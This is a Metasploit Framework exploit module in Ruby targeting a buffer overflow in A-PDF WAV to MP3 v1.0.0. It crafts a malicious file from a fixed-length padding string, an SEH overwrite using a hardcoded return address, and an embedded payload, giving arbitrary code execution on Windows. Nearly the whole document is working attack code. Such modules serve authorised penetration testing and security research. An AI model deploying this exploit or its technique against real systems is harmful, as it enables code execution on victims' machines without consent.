##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'A-PDF WAV to MP3 v1.0.0 Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When
        the application is used to import a specially crafted m3u file, a buffer overflow occurs
        allowing arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'd4rk-h4ck3r', # Original Exploit
          'Dr_IDE',      # SEH Exploit
          'dookie'       # MSF Module
        ],
      'References'     =>
        [
          [ 'OSVDB', '67241' ],
          [ 'EDB', '14676' ],
          [ 'EDB', '14681' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'seh',
          'DisablePayloadHandler' => 'true',
        },
      'Payload'        =>
        {
          'Space'    => 600,
          'BadChars' => "\x00\x0a",
          'StackAdjustment' => -3500
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x0047265c, 'Offset' => 4132 } ],  # p/p/r in wavtomp3.exe
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 17 2010',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.wav']),
      ], self.class)

  end

  def exploit

    sploit = rand_text_alpha_upper(target['Offset'])
    sploit << generate_seh_payload(target.ret)

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(sploit)

  end

end
